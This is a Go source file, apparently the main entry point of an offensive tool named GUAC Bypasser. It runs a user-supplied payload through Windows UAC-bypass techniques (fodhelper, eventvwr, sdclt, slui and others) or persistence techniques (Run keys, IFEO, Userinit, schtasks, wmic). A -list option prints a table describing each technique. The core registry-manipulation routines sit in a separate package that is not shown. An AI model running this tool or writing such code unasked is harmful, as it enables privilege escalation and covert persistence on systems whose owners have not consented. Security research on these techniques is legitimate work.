package main

import (
	"flag"
	"fmt"
	"log"
	"os"

	guacbypasser "./src"
	tablewriter "github.com/0x9ef/tablewriter"
)

func logotype() string {
	var pLogo string = `
    _____  __  __  ___   _____   ___                                            
   / ___/ / / / / / _ | / ___/  | _ )  _  _   _ __   __ _   ___  ___  ___   _ _ 
  / (_ / / /_/ / / __ |/ /__    | _ \ | || | | '_ \ / _  | (_-< (_-< / -_) | '_|
  \___/  \____/ /_/ |_|\___/    |___/  \_, | | .__/ \__,_| /__/ /__/ \___| |_|  
    For researchers only               |__/  |_|           by 0x9ef`
	return pLogo
}

func main() {
	target := flag.String("target", "C:\\payloads\\payload.exe", "Provide path to your payload")
	method := flag.String("method", "fodhelper", "Provide method of UAC bypass")
	list := flag.Bool("list", false, "Provide to get list of all currently techniques implemented")
	flag.Parse()

	if *list == true {
		fmt.Println(logotype() + "\n\r\n\r")
		names := []string{
			"HKCU",
			"HKLM",
			"IFEO",
			"SCHTASKS",
			"USERINIT",
			"WMIC",
			"COMPUTERDEFAULTS",
			"EVENTVWR",
			"FODHELPER",
			"SDCLTCONTROL",
			"SILENTCLEANUP",
			"SLUI",
		}
		types := []string{
			"Persistence",
			"Persistence",
			"Persistence",
			"Persistence",
			"Persistence",
			"Persistence",
			"Once",
			"Once",
			"Once",
			"Once",
			"Once",
			"Once",
		}
		fixed := []string{
			"false",
			"false",
			"false",
			"false",
			"false",
			"false",
			"false",
			"false",
			"false",
			"true",
			"false",
			"true",
		}
		descs := []string{
			"Gain persistence using HKEY_CURRENT_USER Run registry key",
			"Gain persistence using HKEY_LOCAL_MACHINE Run registry key",
			"Gain persistence using IFEO debugger registry key",
			"Gain persistence with system privilege using schtasks",
			"Gain persistence using Userinit registry key",
			"Gain persistence with system privilege using wmic",
			"Bypass UAC using computerdefaults and registry key manipulation",
			"Bypass UAC using eventvwr and registry key manipulation",
			"Bypass UAC using fodhelper and registry key manipulation",
			"Bypass UAC using sdclt (app paths) and registry key manipulation",
			"Bypass UAC using silentcleanup and registry key manipulation",
			"Bypass UAC using slui and registry key manipulation",
		}
		data := [][]string{
			[]string{names[0], types[0], fixed[0], descs[0]},
			[]string{names[1], types[1], fixed[1], descs[1]},
			[]string{names[2], types[2], fixed[2], descs[2]},
			[]string{names[3], types[3], fixed[3], descs[3]},
			[]string{names[4], types[4], fixed[4], descs[4]},
			[]string{names[5], types[5], fixed[5], descs[5]},
			[]string{names[6], types[6], fixed[6], descs[6]},
			[]string{names[7], types[7], fixed[7], descs[7]},
			[]string{names[8], types[8], fixed[8], descs[8]},
			[]string{names[9], types[9], fixed[9], descs[9]},
			[]string{names[10], types[10], fixed[10], descs[10]},
			[]string{names[11], types[11], fixed[11], descs[11]},
		}

		table := tablewriter.NewWriter(os.Stdout)
		table.SetMaxRowWidth(80)
		table.SetHeader([]string{"Name", "Type", "Fixed", "Description"})
		table.SetBorders(tablewriter.Border{Left: true, Top: false, Right: true, Bottom: false})
		table.SetCenterSeparator("|")
		table.AppendBulk(data)
		table.Render()
	}
	if target != nil && *target != "C:\\payloads\\payload.exe" {
		if method != nil {
			err := guacbypasser.Init(*method, *target)
			if err != nil {
				log.Println(err)
			}
		}
	}
}
